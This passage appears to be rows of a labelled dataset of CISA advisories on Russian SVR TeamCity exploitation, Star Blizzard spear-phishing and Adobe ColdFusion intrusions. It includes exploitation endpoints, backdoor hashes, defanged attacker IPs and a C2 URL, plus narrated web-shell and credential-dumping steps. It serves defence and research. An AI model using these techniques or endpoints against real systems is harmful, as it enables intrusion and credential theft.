An attacker may attempt to cover their tracks by wiping this log file. It does not appear that TeamCity logs individual HTTP requests, but if TeamCity is configured to sit behind a HTTP proxy, the HTTP proxy may have suitable logs showing the following target endpoints being accessed:

/app/rest/users/id:1/tokens/RPC2 – This endpoint is required to exploit the vulnerability.
/app/rest/users – This endpoint is only required if the attacker wishes to create an arbitrary user.
/app/rest/debug/processes – This endpoint is only required if the attacker wishes to create an arbitrary process.

Note: The user ID value may be higher than 1.
APPENDIX B – IOCS
File IoCs
GraphicalProton backdoor:

01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732
34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E
620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869
773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13
7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53
8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7
971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC
CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF
CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43
EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E
F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB
C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4
4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166

GraphicalProton HTTPS backdoor:

18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93
19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641
1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8
219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67
92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6
B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7
C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD
C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0
C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3
F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69

Backdoored vcperf:

D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443

Backdoored Zabbix installation archive:

4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F

Backdoored Webroot AV installation archive:

950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4

Modified rsockstun

CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF

Network IoCs
Tunnel Endpoints

65.20.97,.,203
65.21.51,.,58

Exploitation Server

103.76.128,.,34

GraphicalProton HTTPS C2 URL:
hxxps://matclick,.,com/wp-query,.,php







This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a
9,"



The Russia-based actor is targeting organizations and individuals in the UK and other geographical areas of interest.
OVERVIEW
The Russia-based actor Star Blizzard (formerly known as SEABORGIUM, also known as Callisto Group/TA446/COLDRIVER/TAG-53/BlueCharlie) continues to successfully use spear-phishing attacks against targeted organizations and individuals in the UK, and other geographical areas of interest, for information-gathering activity.
The UK National Cyber Security Centre (NCSC), the US Cybersecurity and Infrastructure Security Agency (CISA), the US Federal Bureau of Investigation (FBI), the US National Security Agency (NSA), the US Cyber National Mission Force (CNMF), the Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the Canadian Centre for Cyber Security (CCCS), and the New Zealand National Cyber Security Centre (NCSC-NZ) assess that Star Blizzard is almost certainly subordinate to the Russian Federal Security Service (FSB) Centre 18.
Industry has previously published details of Star Blizzard. This advisory draws on that body of information.
This advisory raises awareness of the spear-phishing techniques Star Blizzard uses to target individuals and organizations. This activity is continuing through 2023.
To download a PDF version of this advisory, see Russian FSB Cyber Actor Star Blizzard Continues Worldwide Spear-phishing Campaigns.
TARGETING PROFILE
Since 2019, Star Blizzard has targeted sectors including academia, defense, governmental organizations, NGOs, think tanks and politicians.
Targets in the UK and US appear to have been most affected by Star Blizzard activity, however activity has also been observed against targets in other NATO countries, and countries neighboring Russia.
During 2022, Star Blizzard activity appeared to expand further, to include defense-industrial targets, as well as US Department of Energy facilities.
OUTLINE OF THE ATTACKS
The activity is typical of spear-phishing campaigns, where an actor targets a specific individual or group using information known to be of interest to the targets. In a spear-phishing campaign, an actor perceives their target to have direct access to information of interest, be an access vector to another target, or both.
Research and Preparation
Using open-source resources to conduct reconnaissance, including social media and professional networking platforms, Star Blizzard identifies hooks to engage their target. They take the time to research their interests and identify their real-world social or professional contacts [T1589], [T1593].
Star Blizzard creates email accounts impersonating known contacts of their targets to help appear legitimate. They also create fake social media or networking profiles that impersonate respected experts [T1585.001] and have used supposed conference or event invitations as lures.
Star Blizzard uses webmail addresses from different providers, including Outlook, Gmail, Yahoo and Proton mail in their initial approach [T1585.002], impersonating known contacts of the target or well-known names in the target’s field of interest or sector.
To appear authentic, the actor also creates malicious domains resembling legitimate organizations [T1583.001].
Microsoft Threat Intelligence Center (MSTIC) provides a list of observed Indicators of Compromise (IOCs) in their SEABORGIUM blog, but this is not exhaustive.
Preference for Personal Email Addresses
Star Blizzard has predominantly sent spear-phishing emails to targets’ personal email addresses, although they have also used targets’ corporate or business email addresses. The actors may intentionally use personal emails to circumvent security controls in place on corporate networks.
Building a Rapport
Having taken the time to research their targets’ interests and contacts to create a believable approach, Star Blizzard now starts to build trust. They often begin by establishing benign contact on a topic they hope will engage their targets. There is often some correspondence between attacker and target, sometimes over an extended period, as the attacker builds rapport.
Delivery of Malicious Link
Once trust is established, the attacker uses typical phishing tradecraft and shares a link [T1566.002], apparently to a document or website of interest. This leads the target to an actor-controlled server, prompting the target to enter account credentials.
The malicious link may be a URL in an email message, or the actor may embed a link in a document [T1566.001] on OneDrive, Google Drive, or other file-sharing platforms.
Star Blizzard uses the open-source framework EvilGinx in their spear- phishing activity, which allows them to harvest credentials and session cookies to successfully bypass the use of two-factor authentication [T1539], [T1550.004].
Exploitation and Further Activity
Whichever delivery method is used, once the target clicks on the malicious URL, they are directed to an actor-controlled server that mirrors the sign-in page for a legitimate service. Any credentials entered at this point are now compromised.
Star Blizzard then uses the stolen credentials to log in to a target’s email account [T1078], where they are known to access and steal emails and attachments from the victim’s inbox [T1114.002]. They have also set up mail- forwarding rules, giving them ongoing visibility of victim correspondence [T1114.003].
The actor has also used their access to a victim email account to access mailing-list data and a victim’s contacts list, which they then use for follow- on targeting. They have also used compromised email accounts for further phishing activity [T1586.002].
CONCLUSION
Spear-phishing is an established technique used by many actors, and Star Blizzard uses it successfully, evolving the technique to maintain their success.
Individuals and organizations from previously targeted sectors should be vigilant of the techniques described in this advisory.
In the UK you can report related suspicious activity to the NCSC.
Information on effective defense against spear-phishing is included in the Mitigations section below.
MITRE ATT&CK®
This report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.



Tactic
ID
Technique
Procedure




Reconnaissance
T1593
Search Open Websites/Domains
Star Blizzard uses open-source research and social media to identify information about victims to use in targeting.


Reconnaissance
T1589
Gather Victim Identity Information
Star Blizzard uses online data sets and open-source resources to gather information about their targets.


Resource Development
T1585.001
Establish Accounts: Social Media Accounts
Star Blizzard has been observed establishing fraudulent profiles on professional networking sites to conduct reconnaissance.


Resource Development
T1585.002
Establish Accounts: Email Accounts
Star Blizzard registers consumer email accounts matching the names of individuals they are impersonating to conduct spear-phishing activity.


Resource Development
T1583.001
Acquire Infrastructure: Domains
Star Blizzard registers domains to host their phishing framework.


Resource Development
T1586.002
Compromise Accounts: Email Accounts
Star Blizzard has been observed using compromised victim email accounts to conduct spear-phishing activity against contacts of the original victim.


Initial Access
T1078
Valid Accounts
Star Blizzard uses compromised credentials, captured from fake log- in pages, to log in to valid victim user accounts.


Initial Access
T1566.001
Phishing: Spear-phishing Attachment
Star Blizzard uses malicious links embedded in email attachments to direct victims to their credential-stealing sites.


Initial Access
T1566.002
Phishing: Spear-phishing Link
Star Blizzard sends spear-phishing emails with malicious links directly to credential-stealing sites, or to documents hosted on a file-sharing site, which then direct victims to credential-stealing sites.


Defense Evasion
T1550.004
Use Alternate Authentication Material: Web Session Cookie
Star Blizzard bypasses multi-factor authentication on victim email accounts by using session cookies stolen using EvilGinx.


Credential Access
T1539
Steal Web Session Cookie
Star Blizzard uses EvilGinx to steal the session cookies of victims directed to their fake log-in domains.


Collection
T1114.002
Email Collection: Remote Email Collection
Star Blizzard interacts directly with externally facing Exchange services, Office 365 and Google Workspace to access email and steal information using compromised credentials or access tokens.


Collection
T1114.003
Email Collection: Email Forwarding Rule
Star Blizzard abuses email- forwarding rules to monitor the activities of a victim, steal information, and maintain persistent access to victim's emails, even after compromised credentials are reset.



MITIGATIONS
A number of mitigations will be useful in defending against the activity described in this advisory.

Use strong passwords. Use a separate password for email accounts and avoid password re-use across multiple services. See NCSC guidance: Top Tips for Staying Secure Online.
Use multi-factor authentication (2-factor authentication/two-step authentication) to reduce the impact of password compromises. See NCSC guidance: Multi-factor Authentication for Online Services and Setting Up 2-Step Verification (2SV).
Protect your devices and networks by keeping them up to date: Use the latest supported versions, apply security updates promptly, use anti-virus and scan regularly to guard against known malware threats. See NCSC guidance: Device Security Guidance.
Exercise vigilance. Spear-phishing emails are tailored to avoid suspicion. You may recognize the sender’s name, but has the email come from an address that you recognize? Would you expect contact from this person’s webmail address rather than their corporate email address? Has the suspicious email come to your personal/webmail address rather than your corporate one? Can you verify that the email is legitimate via another means? See NCSC guidance: Phishing attacks: Defending Your Organization and Internet Crime Complaint Center(IC3) | Industry Alerts.
Enable your email providers’ automated email scanning features. These are turned on by default for consumer mail providers. See NCSC guidance: Telling Users to ""Avoid Clicking Bad Links"" Still Isn’t Working.
Disable mail-forwarding. Attackers have been observed to set up mail-forwarding rules to maintain visibility of target emails. If you cannot disable mail-forwarding, then monitor settings regularly to ensure that a forwarding rule has not been set up by an external malicious actor.

DISCLAIMER
This report draws on information derived from NCSC and industry sources. Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.
This information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt under other UK information legislation.
Refer any FOIA queries to ncscinfoleg@ncsc.gov.uk.
All material is UK Crown Copyright©.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1586.002', 'T1585.001', 'T1583.001', 'T1585.002', 'T1566.002', 'T1114.003', 'T1566.001', 'T1539', 'T1589', 'T1550.004', 'T1593', 'T1114.002', 'T1078'}","



The Russia-based actor is targeting organizations and individuals in the UK and other geographical areas of interest.
OVERVIEW
The Russia-based actor Star Blizzard (formerly known as SEABORGIUM, also known as Callisto Group/TA446/COLDRIVER/TAG-53/BlueCharlie) continues to successfully use spear-phishing attacks against targeted organizations and individuals in the UK, and other geographical areas of interest, for information-gathering activity.
The UK National Cyber Security Centre (NCSC), the US Cybersecurity and Infrastructure Security Agency (CISA), the US Federal Bureau of Investigation (FBI), the US National Security Agency (NSA), the US Cyber National Mission Force (CNMF), the Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the Canadian Centre for Cyber Security (CCCS), and the New Zealand National Cyber Security Centre (NCSC-NZ) assess that Star Blizzard is almost certainly subordinate to the Russian Federal Security Service (FSB) Centre 18.
Industry has previously published details of Star Blizzard. This advisory draws on that body of information.
This advisory raises awareness of the spear-phishing techniques Star Blizzard uses to target individuals and organizations. This activity is continuing through 2023.
To download a PDF version of this advisory, see Russian FSB Cyber Actor Star Blizzard Continues Worldwide Spear-phishing Campaigns.
TARGETING PROFILE
Since 2019, Star Blizzard has targeted sectors including academia, defense, governmental organizations, NGOs, think tanks and politicians.
Targets in the UK and US appear to have been most affected by Star Blizzard activity, however activity has also been observed against targets in other NATO countries, and countries neighboring Russia.
During 2022, Star Blizzard activity appeared to expand further, to include defense-industrial targets, as well as US Department of Energy facilities.
OUTLINE OF THE ATTACKS
The activity is typical of spear-phishing campaigns, where an actor targets a specific individual or group using information known to be of interest to the targets. In a spear-phishing campaign, an actor perceives their target to have direct access to information of interest, be an access vector to another target, or both.
Research and Preparation
Using open-source resources to conduct reconnaissance, including social media and professional networking platforms, Star Blizzard identifies hooks to engage their target. They take the time to research their interests and identify their real-world social or professional contacts,.
Star Blizzard creates email accounts impersonating known contacts of their targets to help appear legitimate. They also create fake social media or networking profiles that impersonate respected experts, and have used supposed conference or event invitations as lures.
Star Blizzard uses webmail addresses from different providers, including Outlook, Gmail, Yahoo and Proton mail in their initial approach, impersonating known contacts of the target or well-known names in the target’s field of interest or sector.
To appear authentic, the actor also creates malicious domains resembling legitimate organizations,.
Microsoft Threat Intelligence Center (MSTIC) provides a list of observed Indicators of Compromise (IOCs) in their SEABORGIUM blog, but this is not exhaustive.
Preference for Personal Email Addresses
Star Blizzard has predominantly sent spear-phishing emails to targets’ personal email addresses, although they have also used targets’ corporate or business email addresses. The actors may intentionally use personal emails to circumvent security controls in place on corporate networks.
Building a Rapport
Having taken the time to research their targets’ interests and contacts to create a believable approach, Star Blizzard now starts to build trust. They often begin by establishing benign contact on a topic they hope will engage their targets. There is often some correspondence between attacker and target, sometimes over an extended period, as the attacker builds rapport.
Delivery of Malicious Link
Once trust is established, the attacker uses typical phishing tradecraft and shares a link, apparently to a document or website of interest. This leads the target to an actor-controlled server, prompting the target to enter account credentials.
The malicious link may be a URL in an email message, or the actor may embed a link in a document, on OneDrive, Google Drive, or other file-sharing platforms.
Star Blizzard uses the open-source framework EvilGinx in their spear- phishing activity, which allows them to harvest credentials and session cookies to successfully bypass the use of two-factor authentication,.
Exploitation and Further Activity
Whichever delivery method is used, once the target clicks on the malicious URL, they are directed to an actor-controlled server that mirrors the sign-in page for a legitimate service. Any credentials entered at this point are now compromised.
Star Blizzard then uses the stolen credentials to log in to a target’s email account, where they are known to access and steal emails and attachments from the victim’s inbox,. They have also set up mail- forwarding rules, giving them ongoing visibility of victim correspondence,.
The actor has also used their access to a victim email account to access mailing-list data and a victim’s contacts list, which they then use for follow- on targeting. They have also used compromised email accounts for further phishing activity,.
CONCLUSION
Spear-phishing is an established technique used by many actors, and Star Blizzard uses it successfully, evolving the technique to maintain their success.
Individuals and organizations from previously targeted sectors should be vigilant of the techniques described in this advisory.
In the UK you can report related suspicious activity to the NCSC.
Information on effective defense against spear-phishing is included in the Mitigations section below.
MITRE ATT&CK®
This report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.

MITIGATIONS
A number of mitigations will be useful in defending against the activity described in this advisory.

Use strong passwords. Use a separate password for email accounts and avoid password re-use across multiple services. See NCSC guidance: Top Tips for Staying Secure Online.
Use multi-factor authentication (2-factor authentication/two-step authentication) to reduce the impact of password compromises. See NCSC guidance: Multi-factor Authentication for Online Services and Setting Up 2-Step Verification (2SV).
Protect your devices and networks by keeping them up to date: Use the latest supported versions, apply security updates promptly, use anti-virus and scan regularly to guard against known malware threats. See NCSC guidance: Device Security Guidance.
Exercise vigilance. Spear-phishing emails are tailored to avoid suspicion. You may recognize the sender’s name, but has the email come from an address that you recognize? Would you expect contact from this person’s webmail address rather than their corporate email address? Has the suspicious email come to your personal/webmail address rather than your corporate one? Can you verify that the email is legitimate via another means? See NCSC guidance: Phishing attacks: Defending Your Organization and Internet Crime Complaint Center(IC3) | Industry Alerts.
Enable your email providers’ automated email scanning features. These are turned on by default for consumer mail providers. See NCSC guidance: Telling Users to ""Avoid Clicking Bad Links"" Still Isn’t Working.
Disable mail-forwarding. Attackers have been observed to set up mail-forwarding rules to maintain visibility of target emails. If you cannot disable mail-forwarding, then monitor settings regularly to ensure that a forwarding rule has not been set up by an external malicious actor.

DISCLAIMER
This report draws on information derived from NCSC and industry sources. Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.
This information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt under other UK information legislation.
Refer any FOIA queries to ncscinfoleg@ncsc.gov.uk.
All material is UK Crown Copyright©.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-341a
10,"






Actions to take today to mitigate malicious cyber activity:




Prioritize remediating known exploited vulnerabilities.
Employ proper network segmentation.
Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) is releasing a Cybersecurity Advisory (CSA) in response to confirmed exploitation of CVE-2023-26360 by unidentified threat actors at a Federal Civilian Executive Branch (FCEB) agency. This vulnerability presents as an improper access control issue impacting Adobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier). CVE-2023-26360 also affects ColdFusion 2016 and ColdFusion 11 installations; however, they are no longer supported since they reached end of life. Exploitation of this CVE can result in arbitrary code execution. Following the FCEB agency’s investigation, analysis of network logs confirmed the compromise of at least two public-facing servers within the environment between June and July 2023.
This CSA provides network defenders with tactics, techniques, and procedures (TTPs), indicators of compromise (IOCs), and methods to detect and protect against similar exploitation.
Download the PDF version of this report:


AA23-339A Threat Actors Exploit Adobe ColdFusion CVE-2023-26360 for Initial Access to Government Servers
(PDF,       449.49 KB
  )


For a downloadable copy of IOCs, see:


AA23-339A STIX XML
(XML,       23.83 KB
  )




AA23-339A STIX JSON
(JSON,       23.29 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for tables mapped to the threat actors’ activity.
Overview
Adobe ColdFusion is a commercial application server used for rapid web-application development. ColdFusion supports proprietary markup languages for building web applications and integrates external components like databases and other third-party libraries. ColdFusion uses a proprietary language, ColdFusion Markup Language (CFML), for development but the application itself is built using JAVA.
In June 2023, through the exploitation of CVE-2023-26360, threat actors were able to establish an initial foothold on two agency systems in two separate instances. In both incidents, Microsoft Defender for Endpoint (MDE) alerted of the potential exploitation of an Adobe ColdFusion vulnerability on public-facing web servers in the agency’s pre-production environment. Both servers were running outdated versions of software which are vulnerable to various CVEs. Additionally, various commands were initiated by the threat actors on the compromised web servers; the exploited vulnerability allowed the threat actors to drop malware using HTTP POST commands to the directory path associated with ColdFusion.
Analysis suggests that the malicious activity conducted by the threat actors was a reconnaissance effort to map the broader network. No evidence is available to confirm successful data exfiltration or lateral movement during either incident. Note: It is unknown if the same or different threat actors were behind each incident.
Incident 1
As early as June 26, 2023, threat actors obtained an initial foothold on a public-facing [T1190] web server running Adobe ColdFusion v2016.0.0.3 through exploitation of CVE-2023-26360. Threat actors successfully connected from malicious IP address 158.101.73[.]241. Disclaimer: CISA recommends organizations investigate or vet this IP address prior to taking action, such as blocking. This IP resolves to a public cloud service provider and possibly hosts a large volume of legitimate traffic.
The agency’s correlation of Internet Information Services (IIS) logs against open source[1] information indicates that the identified uniform resource identifier (URI) /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc was used to exploit CVE-2023-26360. The agency removed the asset from the network within 24 hours of the MDE alert.
Threat actors started process enumeration to obtain currently running processes on the web server and performed a network connectivity check, likely to confirm their connection was successful. Following additional enumeration efforts to obtain information about the web server and its operating system [T1082], the threat actors checked for the presence of ColdFusion version 2018 [T1518]—previous checks were also conducted against version 2016.
Threat actors were observed traversing the filesystem [T1083] and uploading various artifacts to the web server [T1105], to include deleting the file tat.cfm [T1070.004]. Note: This file was deleted prior to the victim locating it on the host for analysis. Its characteristics and functionality are unknown. In addition:

Certutil[2] was run against conf.txt [T1140] and decoded as a web shell (config.jsp) [T1505.003],[T1036.008]. Conf.txt was subsequently deleted, likely to evade detection.Note: Threat actors were only observed interacting with the config.jsp web shell from this point on.
HTTP POST requests [T1071.001] were made to config.cfm, an expected configuration file in a standard installation of ColdFusion [T1036.005]. Code review of config.cfm indicated malicious code—intended to execute on versions of ColdFusion 9 or less—was inserted with the intent to extract username, password, and data source uniform resource locators (URLs). According to analysis, this code insertion could be used in future malicious activity by the threat actors (e.g., by using the valid credentials that were compromised). This file also contained code used to upload additional files by the threat actors; however, the agency was unable to identify the source of their origin.
Threat actors attempted to run attrib.exe to hide the newly created config.jsp web shell [T1564.001]. Analysis of this phase found no indication of successful execution.
A small subset of events generated from various ColdFusion application logs identified that tat.cfm, config.jsp, and system.cfm failed to execute on the host due to syntax errors.

Threat actors created various files (see Table 1 below) in the C:\IBM directory using the initialization process coldfusion.exe. None of these files were located on the server (possibly due to threat actor deletion) but are assessed as likely threat actor tools. Analysts assessed the C:\IBM directory as a staging folder to support threat actors’ malicious operations.
Disclaimer: Organizations are encouraged to investigate the use of these files for related signs of compromise prior to performing remediation actions. Two artifacts are legitimate Microsoft files; threat actors were observed using these files following initial compromise for intended malicious purposes.

Table 1: Threat Actor Tools


File Name
Hash (SHA-1)
Description




eee.exe
b6818d2d5cbd902ce23461f24fc47e24937250e6
VirusTotal[3] flags this file as malicious. This was located in D:\$RECYCLE.BIN.


edge.exe
75a8ceded496269e9877c2d55f6ce13551d93ff4

The dynamic-link library (DLL) file msedge.dll attempted to execute via edge.exe but received an error.
Note: This file is part of the official Microsoft Edge browser and is a cookie exporter.



fscan.exe
be332b6e2e2ed9e1e57d8aafa0c00aa77d4b8656
Analysis confirmed at least three subnets were scanned using fscan.exe, which was launched from the C:\IBM directory [T1046].


RC.exe
9126b8320d18a52b1315d5ada08e1c380d18806b

RCDLL.dll attempted to execute via RC.exe but received an error.
Note: This file is part of the official Windows operating system and is called Microsoft Resource Compiler.




Note: The malicious code found on the system during this incident contained code that, when executed, would attempt to decrypt passwords for ColdFusion data sources. The seed value included in the code is a known value for ColdFusion version 8 or older—where the seed value was hard-coded. A threat actor who has control over the database server can use the values to decrypt the data source passwords in ColdFusion version 8 or older. The victim’s servers were running a newer version at the time of compromise; thus, the malicious code failed to decrypt passwords using the default hard-coded seed value for the older versions.
Incident 2
As early as June 2, 2023, threat actors obtained an initial foothold on an additional public-facing web server running Adobe ColdFusion v2021.0.0.2 via malicious IP address 125.227.50[.]97 through exploitation of CVE-2023-26360. Threat actors further enumerated domain trusts to identify lateral movement opportunities [T1482] by using nltest commands. The threat actors also collected information about local [T1087.001] and domain [T1087.002] administrative user accounts while performing reconnaissance by using commands such as localgroup, net user, net user /domain, and ID. Host and network reconnaissance efforts were further conducted to discover network configuration, time logs, and query user information.
Threat actors were observed dropping the file d.txt—decoded as d.jsp—via POST command in addition to eight malicious artifacts (hiddenfield.jsp, hiddenfield_jsp.class, hiddenfield_jsp.java, Connection.jsp, Connection_jsp.class, Connection_jsp.java, d_jsp.class, and d_jsp.java/). According to open source information, d.jsp is a remote access trojan (RAT) that utilizes a JavaScript loader [T1059.007] to infect the device and requires communication with the actor-controlled server to perform actions.[4] The agency’s analysis identified the trojan as a modified version of a publicly available web shell code.[5] After maintaining persistence, threat actors periodically tested network connectivity by pinging Google’s domain name system (DNS) [T1016.001]. The threat actors conducted additional reconnaissance efforts via searching for the .jsp files that were uploaded.
Threat actors attempted to exfiltrate the (Registry) files sam.zip, sec.zip, blank.jsp, and cf-bootstrap.jar. Windows event logs identified the actors were not successful due to the malicious activity being detected and quarantined. An additional file (sys.zip) was created on the system; however, there were no indications of any attempt to exfiltrate it. Analysis identified these files resulted from executed save and compress data processes from the HKEY_LOCAL_MACHINE (HKLM) Registry key, as well as save security account manager (SAM) [T1003.002] information to .zip files. The SAM Registry file may allow for malicious actors to obtain usernames and reverse engineer passwords; however, no artifacts were available to confirm that the threat actors were successful in exfiltrating the SAM Registry hive.
Windows event logs show that a malicious file (1.dat) was detected and quarantined. Analysis determined this file was a local security authority subsystem service (LSASS) dump [T1003.001] file that contained user accounts—to include multiple disabled credentials—and Windows new technology LAN manager (NTLM) passwords. The accounts were found on multiple servers across the victim’s network and were not successfully used for lateral movement.
As efforts for reconnaissance continued, the threat actors changed their approach to using security tools that were present on the victim server. Esentutl.exe[6] was used to attempt this registry dump. Attempts to download data from the threat actors’ command and control (C2) server were also observed but blocked and logged by the victim server. Threat actors further attempted to access SYSVOL, which is used to deliver policy and logon scripts to domain members on an agency domain controller [T1484.001]. The attempt was unsuccessful. Had the attempt succeeded, the threat actors may have been able to change policies across compromised servers.[7]
Note: During this incident, analysis strongly suggests that the threat actors likely viewed the data contained in the ColdFusion seed.properties file via the web shell interface. The seed.properties file contains the seed value and encryption method used to encrypt passwords. The seed values can also be used to decrypt passwords. No malicious code was found on the victim system to indicate the threat actors attempted to decode any passwords using the values found in seed.properties file. Versions of ColdFusion 9 or greater use the seed.properties file, which contains unique seed values that can only be used on a single server.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 2-9 for all referenced threat actor tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.

Table 2: Initial Access


Technique Title
ID
Use




Exploit Public-Facing Application
T1190
Threat actors exploited two public-facing web servers running outdated versions of Adobe ColdFusion.




Table 3: Execution


Technique Title
ID
Use




Command and Scripting Interpreter: JavaScript
T1059.007
In correlation with open source information, analysis determined d.jsp is a RAT that utilizes a JavaScript loader to infect the device and requires communication with the actor-controlled server to perform actions.




Table 4: Persistence


Technique Title
ID
Use




Server Software Component: Web Shell
T1505.003
Threat actors uploaded various web shells to enable remote code execution and to execute commands on compromised web servers.




Table 5: Privilege Escalation


Technique Title
ID
Use




Domain Policy Modification: Group Policy Modification
T1484.001
Threat actors attempted to edit SYSVOL on an agency domain controller to change policies.




Table 6: Defense Evasion


Technique Title
ID
Use




Masquerading: Match Legitimate Name or Location
T1036.005
Threat actors inserted malicious code with the intent to extract username, password, and data source URLs into config.cfm—an expected configuration file in a standard installation of ColdFusion.


Masquerading: Masquerade File Type
T1036.008
Threat actors used the .txt file extension to disguise malware files.


Indicator Removal: File Deletion
T1070.004
Threat actors deleted files following upload to remove malicious indicators.


Deobfuscate/Decode Files or Information
T1140
Threat actors used certutil to decode web shells hidden inside .txt files.


Hide Artifacts: Hidden Files and Directories
T1564.001
Threat actors attempted to run attrib.exe to hide the newly created config.jsp web shell.




Table 7: Credential Access


Technique Title
ID
Use




OS Credential Dumping: LSASS Memory
T1003.001
Threat actors attempted to harvest user account credentials through LSASS memory dumping.


OS Credential Dumping: Security Account Manager
T1003.002
Threat actors saved and compressed SAM information to .zip files.




Table 8: Discovery


Technique Title
ID
Use




System Network Configuration Discovery: Internet Connection Discovery
T1016.001
Threat actors periodically tested network connectivity by pinging Google’s DNS.


Network Service Discovery
T1046
Threat actors scanned at least three subnets to gather network information using fscan.exe, to include administrative data for future exfiltration.


System Information Discovery
T1082
Threat actors collected information about the web server and its operating system.


File and Directory Discovery
T1083
Threat actors traversed and were able to search through folders on the victim’s web server filesystem. Additional reconnaissance efforts were conducted via searching for the .jsp files that were uploaded.


Account Discovery: Local Account
T1087.001
Threat actors collected information about local user accounts.


Account Discovery: Domain Account
T1087.002
Threat actors collected information about domain users, including identification of domain admin accounts.


Domain Trust Discovery
T1482
Threat actors enumerated domain trusts to identify lateral movement opportunities.


Software Discovery
T1518
Following initial access and enumeration, threat actors checked for the presence of ColdFusion version 2018 on the victim web server.




Table 9: Command and Control


Technique Title
ID
Use




Application Layer Protocol: Web Protocols
T1071.001
Threat actors used HTTP POST requests to config.cfm, an expected configuration file in a standard installation of ColdFusion.


Ingress Tool Transfer
T1105
Threat actors were able to upload malicious artifacts to the victim web server.



MITIGATIONS
CISA recommends organizations implement the mitigations below to improve your organization’s cybersecurity posture based on threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
These mitigations apply to all critical infrastructure organizations and network defenders. CISA recommends that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices, limiting the impact of threat actor techniques and strengthening the security posture for their customers. For more information on secure by design, see CISA’s Secure by Design webpage.
Manage Vulnerabilities and Configurations

Upgrade all versions affected by this vulnerability. Keep all software up to date and prioritize patching according to CISA’s Known Exploited Vulnerabilities Catalog [1.E].
Prioritize remediation of vulnerabilities on internet-facing systems, for example, by conducting continuous automated and/or routine vulnerability scans.
Prioritize secure-by-default configurations such as eliminating default passwords, implementing single sign-on (SSO) technology via modern open standards. This also includes disabling default credentials.

Segment Networks

Employ proper network segmentation, such as a demilitarized zone (DMZ) [2.F]. The end goal of a DMZ network is to allow an organization to access untrusted networks, such as the internet, while ensuring its private network or local area network (LAN) remains secure. Organizations typically store external-facing services and resources—as well as servers used for DNS, file transfer protocol (FTP), mail, proxy, voice over internet protocol (VoIP)—and web servers in the DMZ.
Use a firewall or web-application firewall (WAF) and enable logging [2.G, 2.T] to prevent/detect potential exploitation attempts. Review ingress and egress firewall rules and block all unapproved protocols. Limit risky (but approved) protocols through rules.
